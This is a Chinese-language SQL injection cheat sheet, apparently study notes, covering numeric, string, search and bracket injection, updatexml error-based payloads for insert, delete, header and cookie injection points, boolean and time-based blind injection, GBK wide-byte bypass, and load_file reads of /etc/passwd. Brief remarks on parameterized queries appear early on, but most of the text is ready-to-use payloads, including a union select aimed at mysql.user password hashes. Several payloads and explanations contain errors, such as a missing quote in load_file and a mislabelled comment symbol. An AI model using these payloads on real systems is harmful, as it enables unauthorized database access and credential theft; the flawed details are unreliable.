# TOP漏洞

## Sql注入

### 普通注入型

#### 数字型

数字型SQL注入是一种SQL注入攻击的特定类型，**其主要目标是在数据库查询中注入数字值，而不是字符串或其他数据类型**。SQL注入是一种常见的网络安全漏洞，攻击者通过在输入字段中插入恶意SQL代码来利用这种漏洞。

数字型SQL注入通常发生在用户提供数字输入的情况下，例如在网页表单中输入年龄、价格、数量等等。攻击者试图将恶意的SQL代码插入到这些数字输入字段中，以尝试执行未经授权的数据库操作。

以下是数字型SQL注入的一个简单示例。假设一个网站有一个搜索功能，允许用户根据产品价格来搜索商品：

原始查询:
```sql
SELECT * FROM products WHERE price = $user_input;
```

攻击者可以尝试在价格字段中注入恶意SQL代码，例如：

用户输入: 100 OR 1=1;

修改后的查询:
```sql
SELECT * FROM products WHERE price = 100 OR 1=1;
```

上述注入将导致数据库检索所有产品，而不仅仅是价格为100的产品，因为1=1始终为真。

为了防止数字型SQL注入攻击，开发人员应该使用参数化查询或预处理语句，以确保用户输入的数据被正确地转义和处理，而不会被视为SQL代码的一部分。这样可以有效地防止恶意用户利用数字型SQL注入来访问或修改数据库中的数据。

#### 字符型

字符型SQL注入是一种SQL注入攻击的常见形式，攻击者利用这种漏洞通过输入恶意的字符或字符串来篡改、绕过或操纵应用程序与数据库之间的SQL查询。**这种类型的攻击通常发生在用户提供文本输入的情况下，例如在网页表单、搜索框、用户名和密码字段等**。

字符型SQL注入攻击的目标是使应用程序的SQL查询变得不安全，以便攻击者可以执行不经授权的数据库操作或者获取敏感数据。以下是一个字符型SQL注入的简单示例：

假设一个网站有一个登录表单，用户可以通过输入用户名和密码来登录。应用程序可能会使用以下方式来验证用户的身份：

```sql
SELECT * FROM users WHERE username='$username' AND password='$password';
```

攻击者可以尝试在用户名和/或密码字段中输入恶意字符来欺骗应用程序，例如：

用户名：admin' OR '1'='1
密码：任意密码

修改后的查询：
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='任意密码';
```

上述注入将使数据库返回与用户名'admin'相关的记录，并且'1'='1'条件始终为真，因此攻击者可以成功绕过身份验证，以admin用户身份登录。

为了防止字符型SQL注入攻击，开发人员应该使用参数化查询、预处理语句或使用安全的数据库访问框架，以确保用户输入的数据被正确地转义和处理，不会被解释为SQL代码的一部分。这样可以有效地防止恶意用户利用字符型SQL注入来危害应用程序的安全性。

####  搜索型

搜索型注入（Search-based Injection）是一种SQL注入攻击的变种，它通常涉及到用户在应用程序中执行搜索操作的情况。攻击者利用这种漏洞，通过操纵搜索查询来执行恶意的数据库操作或者泄露敏感数据。

搜索型注入攻击通常发生在以下情况下：

1. 搜索表单：当用户可以在网站或应用程序中执行搜索操作时，例如搜索产品、文章、用户或其他信息。攻击者可以在搜索框中输入恶意查询以尝试注入恶意代码。

2. URL参数：有时，搜索查询可以作为URL参数传递给应用程序。攻击者可以修改URL中的参数以执行注入攻击。

以下是一个搜索型注入攻击的简单示例，假设一个网站有一个搜索功能，用户可以搜索产品名称：

原始查询：
```sql
SELECT * FROM products WHERE name LIKE '%$user_input%';
```

攻击者可以尝试在搜索框中输入以下内容：

```
' OR 1=1 #
```

修改后的查询：
```sql
SELECT * FROM products WHERE name LIKE '%' OR 1=1 # %';
```

上述注入将导致数据库返回所有产品，因为1=1条件始终为真，而注释符号"--"会注释掉查询中的其余部分，从而绕过了原始查询的限制。

为了防止搜索型注入攻击，开发人员应该对用户输入进行适当的过滤和转义，或者使用参数化查询来构建SQL查询，以确保用户输入不会被解释为SQL代码的一部分。此外，还可以实施访问控制和权限控制，以减少潜在攻击的影响。

#### xx型

正常sql:

```
SELECT * FROM products WHERE name = 'Sky';
```

xx型:加上括号或者反引号照样可以运行

```
SELECT * FROM products WHERE `name` = ('Sky');
```

' union select user,authentication_string from mysql.user #;

### 函数报错注入型

#### 利用updataxml函数

优点：各种sql类型都可使用，适用于无回显类型

缺点：返回数据长度有限

```sql
updatexml(xml_doument,XPath_string,new_value)
```

第一个参数：XML的内容
第二个参数：是需要update的位置XPATH路径
第三个参数：是更新后的内容
所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式
比如：

```sql
select * from address_book where sex=1 and updatexml(222,concat(0x7e,version()),111);
# 0x7e就是代表‘~’，concat负责连接~和version。
```

得到：

```sql
ERROR 1105 (HY000): XPATH syntax error: '~5.7.24'
```

注入例子：

```sql
# 数字型
id=1 and updatexml(1,concat(0x7e,user()),1)
SQL:select xx from user where id=1 and updatexml(1,concat(0x7e,user()),1) #;

# 字符型
user' and updatexml(1,concat(0x7e,database()),1) #
SQL:select xx from user where username='user' and updatexml(1,concat(0x7e,database()),1) #'

# 搜索型
' and updatexml(1,concat(0x7e,database()),1) #
SELECT * FROM products WHERE name LIKE '%' and updatexml(1,concat(0x7e,database()),1) #%';

# xx型
user') and updatexml(1,concat(0x7e,database()),1) #
SQL:select xx from user where username=('user') and updatexml(1,concat(0x7e,database()),1) #'

# insert型
username=sky' and updatexml(1,concat(0x7e,version()),1) or '&password=123123&sex=1&phonenum=123&email=123&add=123&submit=submit
SQL:insert into user vlues('sky' and updatexml(1,concat(0x7e,version()),1) or '',password,xx,xx,xx)

# delete型
id=61 and updatexml(1,concat(0x7e,database()),1)
SQL:delete from user where id = id=61 and updatexml(1,concat(0x7e,database()),1);

# Header型
pyload' or updatexml(1,concat(0x7e,version()),1) or '
SQL:insert into info vlues('pyload' or updatexml(1,concat(0x7e,version()),1) or '',xx,xx,xx,xx)

# Cookie型
Cookie: ant[uname]=admin' or updatexml(1,concat(0x7e,version()),1) or ';
ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=165edlt61tcbb4rtocpniultdq

SQL:insert into info vlues('admin' or updatexml(1,concat(0x7e,version()),1) or '',10470c3b4b1fed12c3baac014be15fac67c6e815,165edlt61tcbb4rtocpniultdq)
```

### 盲注

#### 布尔盲注

布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 `true` 、 `false`使web页面返回true或者false，从而达到注入的目的来获取信息。

猜测database长度Pyload：

```
admin' and length(database())=1 #
需要利用burpsuite进行sniper达到猜测长度的目的
```

猜测database每个具体字母或数字Pyload：

```
admin' and ascii(substr(database(),1,1))>48 #
admin' and ascii(substr(database(),7,1))>120 #
'1'和'48'为sniper点
```

#### 时间型盲注

注入SQL 代码之后， 存在以下两种情况：

- 如果注入的SQL代码不影响后台[ 数据库] 的正常功能执行， 那么Web 应用的页面显示正确（ 原始页面） 。
- 如果注入的SQL 代码影响后台数据库的正常功能（ 产生了SQL 注入） ， 但是此时Web 应用的页面依旧显示正常（ 原因是Web 应用程序采取了“ 重定向" 或“ 屏蔽 ”措施）。

产生一个疑问： 注入的SQL 代码到底被后台数据库执行了没有？ 即web 应用程序是否存在SQL 注入？
面对这种情况， 之前讲的基于布尔的SQL 盲注很难发挥作用了（ 因为基于布尔的SQL 盲注的前提是web 程序返回的页面存在true 和false 两种不同的页面） 。这时， 一般采用基于web 应用响应时间上的差异来判断是否存在SQL 注入， 即基于时间型SQL 盲注。

Pyload例子：

```sql
vince' and if(length(database())=7,sleep(5),null)#
```

IF(expr1 ，expr2 ，expr3) 如果expr1 为真， 则IF() 函数执行expr2 语句； 否则IF() 函数执行expr3 语句。

### 宽字节注入

#### 什么是宽字节？

如果一个字符的大小是一个字节的，称为窄字节；如果一个字符的大小是两个字节的，成为宽字节

- 像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些编码都是常说的宽字节，也就是只有两字节
- 英文默认占一个字节，中文占两个字节

#### 什么是宽字节注入？

原理：宽字节注入发生的位置就是PHP发送请求到[MYSQL](https://cloud.tencent.com/product/cdb?from_column=20065&from=20065)时字符集使用character_set_client设置值进行了一次编码。在使用PHP连接MySQL的时候，当设置“character_set_client = gbk”时会导致一个编码转换的问题，也就是我们熟悉的宽字节注入

宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）

GBK首字节对应0×81-0xFE，尾字节对应0×40-0xFE（除0×7F），例如%df和%5C会结合；GB2312是被GBK兼容的，它的高位范围是0xA1-0xF7，低位范围是0xA1-0xFE(0x5C不在该范围内)，因此不能使用编码吃掉%5c

Pyload：

```sql
vince%df' or 1=1#
```

加上%df后，%df会和反斜线%5c吃掉，%df%5c会变成一个中文字符運，达到去掉反斜线的作用。

理论上的sql：

```sql
select id,email from member where username='vince運' or 1=1#
```

### 文件读写

1、需要知道数据库所在服务器的物理目录,也就是要找到服务器的某个目录,因为后面要上传文件,这个条件不太容易满足

2、需要mysql的root权限，这个其实很多运维人员为了方便，有时候会开启远程root用户，进行操作。这个条件比较容易满足

3、需要远程目录有写权限,因为目录找到了之后,如果目录没有写权限,那么我们的文件是不能够上传到该目录中去了,写权限的意思就是可以在这个目录中创建文件。一般情况下都是有写权限的,不然很多正常的代码文件都不能上传到目录,而且好多运维人员在创建这种代码目录的时候(nginx,apache、IIS等），都是以管理员身份来创建的。这个条件比较容易满足

4、需要数据库开启secure_file_priv，看下面的解释，其实这个条件很难满足的，但是有些DBA可能会开启这个文件，因为他想上传一些文件的时候，也需要开启这个功能才行。

使用联合查询语句构造，利用注入读取/ect/passwd 文件（linux系统）

```sql
' UNION SELECT 1,load_file(/etc/passwd)#
```

使用联合查询语句构造，利用注入读取c:\1.txt （Windows系统）

```sql
' UNION SELECT 1,load_file('0x433a2f55736572732f48502f4465736b746f702f746573742e747874')# 或者' union select 1,load_file('C:/Users/HP/Desktop/test.txt')#
```

